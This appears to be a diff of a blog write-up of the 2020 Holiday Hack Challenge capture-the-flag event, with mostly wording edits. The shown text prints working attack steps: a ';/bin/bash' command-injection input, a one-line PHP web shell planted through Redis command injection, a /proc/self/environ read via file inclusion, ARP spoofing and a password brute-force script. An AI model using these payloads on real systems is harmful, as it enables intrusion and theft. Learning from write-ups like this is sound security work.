@@ -295,11 +295,11 @@ if (!doNotTrack) {
         </figcaption>
 </figure>
 
-<p>I won’t repeat all of the logistics, instead, I want to dive straight into the challenges themselves. Basically, there were two &ldquo;types&rdquo; of challenges. The main objectives and the &ldquo;terminal&rdquo; challenges. Terminal challenges were typically easier (but definitely fun and challenging too!), and once completed the Elf next to the terminal would typically provide some hints and other info for objectives.</p>
+<p>I won’t repeat all of the logistics, instead, I want to dive straight into the challenges themselves. Basically, there were two &ldquo;types&rdquo; of challenges. The main objectives and the &ldquo;terminal&rdquo; challenges. Terminal challenges were typically easier (but definitely fun and challenging too!), and once completed the Elf next to the terminal would provide some hints and other info for objectives.</p>
 <h2 id="format">format</h2>
 <p>I never really found myself in a position where I did not have an idea of what I had to do. Very clear direction on the challenges were given in the form of hints from Elves, solving terminal challenges or by viewing the <em>Hints</em> section in your badge.</p>
 <h2 id="terminals">terminals</h2>
-<p>Terminal challenges were usually a little easier, but absolutely a blast overall. Once completed, they would reveal vital hints for the main objectives, so clearing them was really important.</p>
+<p>Once completed, terminal challanges would reveal vital hints for the main objectives, so clearing them was really useful and fun!</p>
 <h3 id="unescape-tmux">unescape tmux</h3>
 <p><em>Pepper Minstix</em> stands next to a terminal called &ldquo;Unescape Tmux&rdquo; in the entry area. Something about watching a bird, I don&rsquo;t know.</p>
 <figure>
@@ -346,7 +346,7 @@ You need to power the red, yellow, and green receivers with the right color ligh
         </figcaption>
 </figure>
 
-<p>From the initial output we&rsquo;re asked if we can get a bash shell. Well that sounds doable I&rsquo;m sure.</p>
+<p>From the initial output we&rsquo;re asked if we can get a bash shell.</p>
 <p>Hitting <code>enter</code> after that message we&rsquo;re presented with a menu with a few options. Playing with option <code>4</code> to <em>Print Name Badge</em>, if you entered <code>;/bin/bash</code> as your name you will solve the challenge and get the shell.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/terminal_kringle_kiosk_solved.png"/> <figcaption>
@@ -392,7 +392,7 @@ sleep <span style="color:#f60">2</span>
         </figcaption>
 </figure>
 
-<p>This challenge actually consisted of three challenges in total; door, lights and vending machine and Bushy was happy to give hints for each after completing one. Editable versions of each lived in the <code>lab/</code> directory, making it possible to fiddle with them and not break the &ldquo;real&rdquo; ones.</p>
+<p>This challenge actually consisted of three challenges in total; door, lights and vending machine and Bushy was happy to give hints for each after completing one. Editable versions of each challange lived in the <code>lab/</code> directory, making it possible to fiddle with them and not break the &ldquo;real&rdquo; ones.</p>
 <h4 id="door">door</h4>
 <p>The most important of the challenges, but also the easiest one, we start by just running the <code>door</code> program and see how it behaves.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">elf@aaa8cc7e08d2 ~ $ ./door 
@@ -402,7 +402,7 @@ tool for this...
 What do you enter? &gt; poo
 Checking......
 Beep boop invalid password
-</code></pre></div><p>Ok, <code>poo</code> is not the password. If we run <code>strings</code> over the binary we could maybe narrow it down. A good string to search for would also be <em>&ldquo;What do you enter?&quot;</em>. I usually <code>grep</code> for these types of things to narrow a match down with a little bit of context using the <code>-A</code> and <code>-B</code> flags to print me some data before and after a match. The output from <code>strings</code> over a binary can be noisy, so this is a bit of a habit I guess.</p>
+</code></pre></div><p>Ok, <code>poo</code> is not the password. If we run <code>strings</code> over the binary we could maybe narrow it down. A good string to search for would be <em>&ldquo;What do you enter?&quot;</em>. I usually <code>grep</code> for these types of things to narrow a match down with a little bit of context using the <code>-A</code> and <code>-B</code> flags to print me some data before and after a match. The output from <code>strings</code> over a binary can be noisy, so this is a bit of a habit I guess.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">elf@aaa8cc7e08d2 ~ $ strings door | grep -i &#34;what do you enter&#34; -A 10 -B 10
 6666666666666666\\\\\\\\\\\\\\\\
 vRQ&gt;
@@ -428,7 +428,7 @@ cannot panic during the backtrace function/usr/src/rustc-1.41.1/vendor/backtrace
 omething went wrong: Checking...Something went wrong reading input: Something went wrong in 
 the environment: couldn&#39;t get the executable name
 Something went wrong in the environment: RESOURCE_IDThe error message is: ask for help!
-</code></pre></div><p>Notice the section that reads <code>And don't forget, the password is &quot;Op3nTheD00r&quot;</code> ? There&rsquo;s the password too!</p>
+</code></pre></div><p>Notice the section that reads <code>And don't forget, the password is &quot;Op3nTheD00r&quot;</code> ? There&rsquo;s the password too! If you just grepped for <code>password</code> you would have also found this.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">elf@aaa8cc7e08d2 ~ $ ./door 
 You look at the screen. It wants a password. You roll your eyes - the 
 password is probably stored right in the binary. There&#39;s gotta be a
@@ -446,11 +446,11 @@ You wonder how to turn the lights on? If only you had some kind of hin---
 ---t to help figure out the password... I guess you&#39;ll just have to make do!
 The terminal just blinks: Welcome back, elf-technician
 What do you enter? &gt; 
-</code></pre></div><p>Investigating the configuration files contents shows what looks like an &ldquo;encrypted&rdquo; version of the password is stored.</p>
+</code></pre></div><p>Investigating the configuration files&rsquo; contents shows what looks like an &ldquo;encrypted&rdquo; version of the password is stored.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">elf@51340abdb0bc ~/lab $ cat lights.conf 
 password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
 name: elf-technician
-</code></pre></div><p>I fiddled with the values for a bit, and eventually set the <code>password</code> value for <code>name</code> and ran <code>lights</code> again.</p>
+</code></pre></div><p>I fiddled with the values for a bit, and eventually set the <code>password</code> value for <code>name</code> and ran <code>lights</code> again after reading the hint we had on our badge.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">elf@5641592049a0 ~/lab $ cat lights.conf 
 password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
 name: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
@@ -465,7 +465,7 @@ What do you enter? &gt; Computer-TurnLightsOn
 Checking......
 That would have turned on the lights!
 If you&#39;ve figured out the real password, be sure you run /home/elf/lights
-</code></pre></div><p>Noticed the <code>Computer-TurnLightsOn</code> there? That’s the password ;) Looks like the program jumps into a decryption routine if a value starts with <code>E$</code>. lol.</p>
+</code></pre></div><p>Noticed the <code>Computer-TurnLightsOn</code> there? That’s the password ;) Looks like the program jumps into an opportunistic decryption routine if a value starts with <code>E$</code>. lol.</p>
 <p>With that done, running the real <code>light</code> program should turn the lights on in the Speaker Unpreparedness room.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">
 [ ... ]
@@ -475,14 +475,14 @@ Checking......
 
 Lights on!
 </code></pre></div><h4 id="vending-machine">vending-machine</h4>
-<p>This was actually the very last challenge I solved, and honestly, I don&rsquo;t really like my solution. From all of the hints available both on your badge and from Bushy Evergreen I gathered that it was a classic Vigenère cipher that needed cracking, but alas, I couldn&rsquo;t solve it that way.</p>
-<p>Running the <code>./vending-machine</code> binary, you were asked to enter a code to turn the vending machines back on. Inspecting the <code>vending-machines.json</code> configuration file next to the binary we see:</p>
+<p>This was actually the very last challenge I solved, and honestly, I don&rsquo;t like my solution. From all of the hints available both on your badge and from Bushy Evergreen I gathered that it was a classic Vigenère cipher that needed cracking, but alas, I couldn&rsquo;t solve it that way.</p>
+<p>Running the <code>./vending-machine</code> binary, you were asked to enter a code to turn the vending machine back on. Inspecting the <code>vending-machines.json</code> configuration file next to the binary we see:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
   &#34;name&#34;: <span style="color:#87ceeb">&#34;elf-maintenance&#34;</span>,
   &#34;password&#34;: <span style="color:#87ceeb">&#34;LVEdQPpBwr&#34;</span>
 }
 </code></pre></div><p>In the <code>lab/</code> folder, if we delete the <code>vending-machine.json</code> file and re-run the <code>vending-machine</code> binary, we&rsquo;re asked to enter new fields for a new configuration file. This is what I figured was the Chosen plaintext primitive for the Vigenère crack, but alas, that failed for me.</p>
-<p>After many, many attempts at solving this I asked for some help and was told some people were just brute forcing the password. So, again in the <code>lab/</code> folder I tested the output you&rsquo;d get in the <code>vending-machine.json</code> when choosing single character passwords, and eventually came to see if we used something that started with a <code>C</code>, we&rsquo;d get an output string of <code>L</code> in the <code>.json</code> file.</p>
+<p>After many, many attempts at solving this I asked for some help and was told some people were just brute forcing the password. So, again in the <code>lab/</code> folder I tested the output you&rsquo;d get in the <code>vending-machine.json</code> when choosing single character passwords, and eventually came to see if we used something that started with a <code>C</code>, we&rsquo;d get an output string of <code>L</code> line in the <code>password</code> field in the <code>.json</code> file.</p>
 <p>In the end, I scripted the brute force. Not my proudest moment, but I really tried!</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e5e5e5">#!/bin/bash
 </span><span style="color:#e5e5e5"></span>
@@ -527,7 +527,7 @@ test_pass() {
         </figcaption>
 </figure>
 
-<p>For this challenge, you are presented with a 2D game where you need to control your character using a small JavaScript program. Each level is different and presents you with a gradually more difficult problem to solve.</p>
+<p>Here you are presented with a 2D game where you need to control your character using a small JavaScript program. Each level is different and presents you with a gradually more difficult problem to solve.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/terminal_the_elf_code_level1.png"/> <figcaption>
             <h4>the elf c0de terminal in the dining room</h4>
@@ -591,7 +591,7 @@ elf.moveUp(<span style="color:#f60">2</span>);
         </figcaption>
 </figure>
 
-<p>Picking up the phone and dialling the number you&rsquo;d hear a warped version of initial beep from the ever popular dialup sequence you could hear way, waaaay back. One of the hints Fitzy linked to was a recording of that exact sound here: <a href="https://upload.wikimedia.org/wikipedia/commons/3/33/Dial_up_modem_noises.ogg">https://upload.wikimedia.org/wikipedia/commons/3/33/Dial_up_modem_noises.ogg</a></p>
+<p>Picking up the phone and dialling the number you&rsquo;d hear a warped version of initial beep from the ever popular dialup sequence you would hear way, waaaay back (yeah, I remember those!). One of the hints Fitzy linked to was a recording of that exact sound here: <a href="https://upload.wikimedia.org/wikipedia/commons/3/33/Dial_up_modem_noises.ogg">https://upload.wikimedia.org/wikipedia/commons/3/33/Dial_up_modem_noises.ogg</a></p>
 <p>The words on the note next to the phone corresponded to different sections of the dialup sequence, but they were morphed making them hard to identify quickly. I opened the reference <code>.ogg</code> file in Audacity and started piecing together the bits needed.</p>
 <p>After dialling, the final sequence of words you had to click on the note were:</p>
 <ul>
@@ -662,7 +662,7 @@ drwx------ 1 www-data www-data 4096 Dec 31 10:54 html
 player@f9292a141ef5:/var/www$ 
 </code></pre></div><p>Ah! We can&rsquo;t see what&rsquo;s inside <code>/var/www/html</code>, but redis running as root shouldn&rsquo;t have any problems with that. That gives us a plan of attack. Write a webshell to somewhere in <code>/var/www/html</code> using the Redis command injection we have, and then execute commands as <code>www-data</code> (the webserver is running as this user) to read the <code>index.php</code> file they mention.</p>
 <p>Writing a web shell via Redis is done by configuring Redis (via the command injection) where to save database snapshots, adding a new key containing a web shell, then saving a snapshot. This results in the web shell being written to the path we specified.</p>
-<p>Anyways, now that we&rsquo;re ready to write that web shell. We know the webserver is configured to use PHP, so a small PHP webshell like this should be fine.</p>
+<p>We know the webserver is configured to use PHP, so a small PHP webshell like this should be fine.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?=<span style="color:#87ceeb">`$_GET[1]`</span><span style="color:#e5e5e5">?&gt;</span>
 </code></pre></div><p>Let&rsquo;s write the shell to <code>/var/www/html/c.php</code>. Remember the hint we got when we cURL&rsquo;d the <code>maintenance.php</code> file stating that commands should be separated by commas. I lost some time by not reading that properly.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">player@8bba634ccf77:~$ curl http://localhost/maintenance.php?cmd=&#34;config,set,dir,/var/www/html&#34;
@@ -817,7 +817,7 @@ Your answer is correct!
         </figcaption>
 </figure>
 </p>
-<p>You could click on the questions to get an idea of what type of regular expression they looked for. Some questions had example data that the regex had to match and not match as well. I had valid answers that would have invalid matches be accepted, which wasn&rsquo;t great.</p>
+<p>You could click on the questions to get an idea of what type of regular expression they looked for. Some questions had example data that the regex had to match and not match. I had valid answers that would have invalid matches be accepted, which wasn&rsquo;t great.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/terminal_sort_o_matic_question.png"/> <figcaption>
             <h4>sort-o-matic question format</h4>
@@ -849,7 +849,7 @@ Your answer is correct!
         </figcaption>
 </figure>
 
-<p>Starting a game had you see two squares, one where your fortresses were and another where you have tried to guess where you enemies fortresses were.</p>
+<p>Starting a game had you see two squares, one where your fortresses were and another where you have to guess where you enemies fortresses are.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/terminal_snow_ball_player.png"/> <figcaption>
             <h4>snowball fight player fortresses</h4>
@@ -862,7 +862,7 @@ Your answer is correct!
         </figcaption>
 </figure>
 
-<p>The aim was to win a game on impossible, but if you have that a shot you&rsquo;d see that it’s pretty much impossible. The computer always hit your fortresses with near perfect accuracy. Reading the hints given on your badge and by Tangle Coalbox you&rsquo;d come to realise that the aim here was to predict the numbers used by the computers random number generator. When you chose to play an easy game, your username was used as a seed to determine where all of the fortresses (yours and the computers) would be positioned. If you started multiple consecutive games with the same name (read: seed), the positions would have been exactly the same.</p>
+<p>The aim was to win a game on impossible, but if you gave that a try you&rsquo;d see that it’s pretty much impossible. The computer always hit your fortresses with perfect accuracy. Reading the hints given on your badge and by Tangle Coalbox you&rsquo;d come to realise that the aim here was to predict the numbers used by the computers random number generator. When you chose to play an easy game, your username was used as a seed to determine where all of the fortresses (yours and the computers) would be positioned. If you started multiple consecutive games with the same name (read: seed), the positions would have been exactly the same.</p>
 <p>But on impossible you don’t get to choose your name, the computer generated it for you, and what’s worse, you don’t get to see what it chose. This is what we had to predict. Watching Tom Liston&rsquo;s <a href="https://www.youtube.com/watch?v=Jo5Nlbqd-Vg">talk</a> was key for me to solving this. I learnt a ton about the <a href="https://en.wikipedia.org/wiki/Mersenne_Twister">Mersenne Twister</a> pseudorandom number generator (PRNG), and ways to abuse it. Tim&rsquo;s talk also contained a link to a project of his to help predict the next values of a PRNG granted you were able to seed it with at least 624 previous, sequential values <a href="https://github.com/tliston/mt19937">here</a>.</p>
 <p>Anyways, I&rsquo;m repeating what Tom said in the talk, but I really enjoyed this one okay :) Back to the game, when you start a game on impossible, (conveniently) 624 seeds are placed in an HTML comment that you can view.</p>
 <figure>
@@ -894,7 +894,7 @@ myprng = mt19937(<span style="color:#f60">0</span>)
     myprng.MT[i] = untemper(seeds[i])
 
 <span style="color:#f00">print</span>(f<span style="color:#87ceeb">&#39;next #: {myprng.extract_number()}&#39;</span>)
-</code></pre></div><p>Using the predicted number of <code>324105638</code>, we then start a new easy game making <code>324105638</code> our username and winning it to reveal the positions of the enemy fortresses.</p>
+</code></pre></div><p>Using the predicted number of <code>324105638</code>, we then start a new easy game making <code>324105638</code> our username in an incognito tab, winning it to reveal the positions of the enemy fortresses.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/terminal_snow_ball_easy_predict.png"/> <figcaption>
             <h4>snowball fight easy game with predicted seed</h4>
@@ -910,7 +910,7 @@ myprng = mt19937(<span style="color:#f60">0</span>)
 
 <p>Solving this challenge provides hints for the later blockchain challenges, 11a &amp; 11b.</p>
 <h2 id="objectives">objectives</h2>
-<p>Many of the objectives required hints from some of the <a href="#terminals">terminal</a> challenges first. I did not really have a strategy other than walking around and clicking on terminals as I saw them. As I went through them, I chose to do the main objectives that were available next to them as well. At first, only the first 5 main objectives were visible.</p>
+<p>Many of the objectives required hints from some of the <a href="#terminals">terminal</a> challenges first. I did not really have a strategy other than walking around and clicking on terminals as I saw them. As I went through them, I chose to do the main objectives that were available next to them as well. At first, only the first 5 main objectives were visible until you unlock the door in Santas workshop to impersonate him.</p>
 <h3 id="1---uncover-santas-gift-list">1 - uncover santas gift list</h3>
 <p>When you first login you start off in a staging area. The first objective on your badge reads:</p>
 <blockquote>
@@ -973,7 +973,7 @@ http://s3.amazonaws.com/santa
 Bucket santa redirects to: santa.s3.amazonaws.com
 http://santa.s3.amazonaws.com/
         Bucket found but access denied: santa
-</code></pre></div><p>I was stumped for a while on this one. Most of my attempts was me messing with permutations of the words in the provided word list, until I noticed the <code>wrapper3000</code> hint, and added that to the word list.</p>
+</code></pre></div><p>I was stumped for a while on this one. Most of my attempts was me messing with permutations of the words in the provided word list (I figured those bucket names were generic and surely they were taken before Kringlecon 3), until I noticed the <code>wrapper3000</code> hint, and added that to the word list.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">elf@cb4ef197f1c4:~/bucket_finder$ ./bucket_finder.rb -d wordlist 
 http://s3.amazonaws.com/kringlecastle
 Bucket found but access denied: kringlecastle
@@ -1034,7 +1034,7 @@ North Pole: The Frostiest Place on Earth
 </figure>
 
 <p>Opening the challenge we get a link to download an executable at <a href="https://download.holidayhackchallenge.com/2020/santa-shop/santa-shop.exe">https://download.holidayhackchallenge.com/2020/santa-shop/santa-shop.exe</a>.</p>
-<p>I took this file and ran it on a Windows VM, which installed what looked like an Electron application and presented me with the password screen the challenge referred to. The hint we get from the terminal challenge tells us that it is possible to extract source code for electron apps using a utility called <a href="https://www.npmjs.com/package/asar">asar</a>. More specifically, this utility can read the archive format for <code>.asar</code> files, and we have to get that from the Point-of-Sale application.</p>
+<p>I took this file and ran it on a Windows VM, which installed what looked like an Electron application and presented me with the password screen the challenge referred to. The hint we get from the terminal challenge tells us that it is possible to extract JavaScript source code for electron apps using a utility called <a href="https://www.npmjs.com/package/asar">asar</a>. More specifically, this utility can read the archive format for <code>.asar</code> files, and we have to get that from the Point-of-Sale application.</p>
 <p>To get the file, open task manager after running santa-shop. Browse to the &ldquo;Details&rdquo; tab and search for the <code>santa-shop.exe</code> process. Right click any of the few and hit &ldquo;Open file location&rdquo;.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/pos_pass_file_loc.png"/> <figcaption>
@@ -1234,7 +1234,7 @@ noel boetie (wrapping room)     - #db# TAG ID: 2006e22ee1 (6000) - Format Len: 2
 </ol>
 </blockquote>
 <p>I think this one was the hardest. By now I have gotten into the habit of searching through the Atomic Red Team <code>atomics/</code> directory for details on how some of these techniques were run, but this time I couldn’t find any batch files with correct answers that they were asking for. So, I had to search purely in Splunk this time.</p>
-<p>I figured that with command line auditing enabled we should be able to see at least where/how the batch file would get invoked, and hopefully as a result of the auditing see the subsequent commands in the bat file that were run as well. To narrow things down, I started with this search (removing splunk agents to reduce noise): <code>index=* cmdline=* cmdline!=&quot;*SplunkUniversalForwarder*&quot; &quot;*.bat*&quot;</code>. This resulted in some Sysmon events I could spot, and adding <code>|  stats count by index</code> to the search revealed T1059.003 and T1547.001. Great, however, the Atomic Red Team atomics for those weren&rsquo;t as useful as I had hoped (at least none of my answered worked haha).</p>
+<p>I figured that with command line auditing enabled we should be able to see at least where/how the batch file would get invoked, and hopefully as a result of the auditing see the subsequent commands in the bat file that were run as well. To narrow things down, I started with this search (removing splunk agents to reduce noise): <code>index=* cmdline=* cmdline!=&quot;*SplunkUniversalForwarder*&quot; &quot;*.bat*&quot;</code>. This resulted in some Sysmon events I could spot, and adding <code>|  stats count by index</code> to the search revealed T1059.003 and T1547.001. Great, however, the Atomic Red Team atomics for those weren&rsquo;t as useful as I had hoped (at least none of my answers worked haha).</p>
 <p>To make the data more readable for me with the relevant parts, I tabled the columns I figured would be interesting and started working through those with <code>index=* cmdline=* cmdline!=&quot;*SplunkUniversalForwarder*&quot; &quot;*.bat*&quot; | sort _time desc | table index, cmdline</code>.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/splunk_question_6a.png"/> <figcaption>
@@ -1279,22 +1279,22 @@ noel boetie (wrapping room)     - #db# TAG ID: 2006e22ee1 (6000) - Format Len: 2
         </figcaption>
 </figure>
 
-<p>Clicking on the Sleigh as Santa presented this interface with the message on the right scrolling by really fast.</p>
+<p>Clicking on the Sleigh as Santa presented this interface with the messages on the right scrolling by really fast.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/sleigh_interface.png"/> <figcaption>
             <h4>sleigh can-d-bus interface</h4>
         </figcaption>
 </figure>
 
-<p>It takes a little while to get used to the interface, so clicking around and seeing the effects messages wise is highly encouraged.</p>
-<p>From the <a href="#can-bus-investigation">CANBus investigation challenge</a> we learnt that messages have a type and a data field, separated by the <code>#</code>. As far as filtering goes, the Epoch and Time fields can be ignored. However, the ID and Message fields are. My approach was to filter out everything that was just racing by so I could get the message log as quiet as possible. That meant I had the following rules at first.</p>
+<p>It takes a little while to get used to the interface, so clicking around and seeing the effects it has on the messages you see is highly encouraged.</p>
+<p>From the <a href="#can-bus-investigation">CANBus investigation challenge</a> we learnt that messages have a type and a data field, separated by the <code>#</code>. As far as filtering goes, the Epoch and Time fields can be ignored. The ID and Message fields are important. My approach was to filter out everything that was just racing by so I could get the message log as quiet as possible. That meant I had the following rules at first.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/sleigh_all_filter.png"/> <figcaption>
             <h4>sleigh filtering all default traffic</h4>
         </figcaption>
 </figure>
 
-<p>With the message log quiet, I started to fiddle with the controls and filters to map which message ID&rsquo;s related to which feature. For example, I would toggle the Accelerator up (after starting the sleigh) and then remove filters to see which messages were being generated.</p>
+<p>With the message log quiet, I started to fiddle with the controls and filters to map which message ID&rsquo;s related to which feature. For example, I would toggle the Accelerator up (after starting the sleigh) and then remove filters to see which messages were being generated. Repeating that for each feature I ended with the following list.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">244 - Accelerator
 080 - Brake
 019 - Steering
@@ -1321,7 +1321,7 @@ noel boetie (wrapping room)     - #db# TAG ID: 2006e22ee1 (6000) - Format Len: 2
         </figcaption>
 </figure>
 
-<p>The error displayed reveals a local path of a <code>.rb</code> file (so I guessed this was a Ruby web app), and what I am guessing is a temporary directory for processing uploads. Next, I uploaded a legitimate image which I figured the web app would allow. I opened the browser console to see what web traffic was generated with the upload, which revealed that an accepted image would be loaded from an image specific endpoint.</p>
+<p>The error displayed reveals a local path of a <code>.rb</code> file (so I guessed this was a Ruby web app), and what I am guessing is a temporary directory for processing uploads. Next, I uploaded a legitimate image which I figured the web app would allow. I opened the browser console to see what web traffic was generated with the upload, which revealed that an accepted image would be accessible from an image specific endpoint.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/broken_tag_generator_upload.png"/> <figcaption>
             <h4>broken tag generator upload web traffic</h4>
@@ -1335,7 +1335,7 @@ noel boetie (wrapping room)     - #db# TAG ID: 2006e22ee1 (6000) - Format Len: 2
         </figcaption>
 </figure>
 
-<p>With LFI on Linux hosts you can query for a lot of interesting information from the <code>/proc</code> mount, and given that the challenge asked us to reveal what was stored in an environment variable, we could reveal that by reading <code>/proc/selv/environ</code>.</p>
+<p>With LFI on Linux hosts you can query for a lot of interesting information from the <code>/proc</code> mount, and given that the challenge asked us to reveal what was stored in an environment variable, we could reveal that by reading <code>/proc/self/environ</code>.</p>
 <figure>
     <img src="https://leonjza.github.io/images/holidayhack-20/broken_tag_generator_answer.png"/> <figcaption>
             <h4>broken tag generator `GREETZ` variable</h4>
@@ -1475,7 +1475,7 @@ Capturing on &#39;eth0&#39;
     3 2.092716820 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
     4 3.147953807 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
 ^C4 packets captured
-</code></pre></div><p>Neat, so <code>4c:24:57:ab:ed:84</code> is making the ARP request, so let&rsquo;s forge a response, saying that we are that host! This is where the <code>arp_resp.py</code> script given to us in the <code>scripts/</code> directory will be handy. The parts we need to complete are clearly marked too. Now, an ARP packet actually contains a number of fields. You could view the pcaps in Wireshark (or Cloudshark like the hints had), or, since we&rsquo;re receiving a new ARP request every second, we can use scapy to capture a packet and then just copy out the relevant fields from there. The provided script actually has all the code we need too!</p>
+</code></pre></div><p>Neat, <code>4c:24:57:ab:ed:84</code> is making the ARP request, so let&rsquo;s forge a response, saying that we are that host! This is where the <code>arp_resp.py</code> script given to us in the <code>scripts/</code> directory will be handy. The parts we need to complete are clearly marked too. Now, an ARP packet actually contains a number of fields. You could view the pcaps in Wireshark (or Cloudshark like the hints had), or, since we&rsquo;re receiving a new ARP request every second, we can use scapy to capture a packet and then just copy out the relevant fields from there. The provided script actually has all the code we need too!</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">&gt;&gt;&gt; from scapy.all import *
 &gt;&gt;&gt; sniff(filter=&#34;(arp[6:2] = 1)&#34;, count=1)
 &lt;Sniffed: TCP:0 UDP:0 ICMP:0 Other:1&gt;
@@ -1815,7 +1815,7 @@ c2 = Chain(load=True, filename=<span style="color:#87ceeb">&#39;blockchain.dat&#
 *** WARNING *** Blockchain invalid from block 128449 onward.
 
 chain verify: False
-</code></pre></div><p>Closer inspection of the <code>verify_chain()</code> function reveals that it accepts a second argument to specify the hash for the previous block. Since we don&rsquo;t have the full blockchain data that starts with the genesis block, we need to specify the hash we can find from the data we do have. So, I looped the blocks in the chin after loading and extracted the <code>PreviousHash</code>.</p>
+</code></pre></div><p>Closer inspection of the <code>verify_chain()</code> function reveals that it accepts a second argument to specify the hash for the previous block. Since we don&rsquo;t have the full blockchain data that starts with the genesis block, we need to specify the hash we can find from the data we do have. So, I looped the blocks in the chain after loading and extracted the <code>PreviousHash</code>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#0f0"># [ ... ]</span>
 
 c2 = Chain(load=True, filename=<span style="color:#87ceeb">&#39;blockchain.dat&#39;</span>)
@@ -1869,11 +1869,10 @@ Type &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34;
 &gt;&gt;&gt; 0xe3e12de5edfb51e2
 16420456181932970466
 &gt;&gt;&gt;
-</code></pre></div><p>Easy! We also had a total of <code>1548</code> blocks in our chain, and therefore <code>1548</code> nonces which was more than enough to replicate the state of the PRNG. At this point I realised I did not have to resort to silly shell parsing of the Nonce values as they were available in code when looping the blocks in the blockchain.</p>
+</code></pre></div><p>Easy! We also had a total of <code>1548</code> blocks in our chain, and therefore <code>1548</code> nonces which was more than enough to replicate the state of the PRNG. At this point I also realised I did not have to resort to silly shell parsing of the Nonce values as they were available in code when looping the blocks in the blockchain.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#0f0"># [ ... ]</span>
 
 c2 = Chain(load=True, filename=<span style="color:#87ceeb">&#39;blockchain.dat&#39;</span>)
-<span style="color:#f00">print</span>(f<span style="color:#87ceeb">&#39;chain verify: {c2.verify_chain(official_public_key, &#34;c6e2e6ecb785e7132c8003ab5aaba88d&#34;)}&#39;</span>)
 
 <span style="color:#0f0"># extract the nonce values from all the blocks in the chain</span>
 nonce = [block.nonce <span style="color:#f00">for</span> block in c2.blocks]
@@ -1882,13 +1881,13 @@ nonce = [block.nonce <span style="color:#f00">for</span> block in c2.blocks]
 </code></pre></div><p>This would print the first two nonce values extracted as (notice how they are already integers now!):</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ python3 main-blog.py
 [16420456181932970466, 2411124002006105373]
-</code></pre></div><p>Now at this stage I naively thought I could just replicate what we had done in the <a href="#snowball-fight">snowball fight</a> by replicating the PRNG&rsquo;s state, and then continue to reveal the next values. The problem was though that when you did this, you would not get the correct nonce value! Remember, the question states (and you can easily verify) that the last block we have has the index <code>129996</code>, and they want to know the nonce value for <code>130000</code>. That’s just 4 predictions forward? Well, those values won’t be correct.</p>
-<p>My first hypothesis was that because we are only feeding 624 numbers into the algorithm, our predictions should at least match the nonce value for the 625th block we have in the chain. Alas, even this was incorrect as it seemed like we could not even predict the next one correctly!</p>
+</code></pre></div><p>At this stage I naively thought I could just replicate what we had done in the <a href="#snowball-fight">snowball fight</a> by replicating the PRNG&rsquo;s state, and then continue to reveal the next values. The problem was though that when you did this, you would not get the correct nonce value! Remember, the question states (and you can easily verify) that the last block we have has the index <code>129996</code>, and they want to know the nonce value for <code>130000</code>. That’s just 4 predictions forward? Well, those values won’t be correct.</p>
+<p>My first hypothesis was that because we are only feeding 624 numbers into the algorithm, our predictions should at least match the nonce value for the 625th block we have in the chain, right? No, even this was incorrect as it seemed like we could not even predict the 625th nonce correctly!</p>
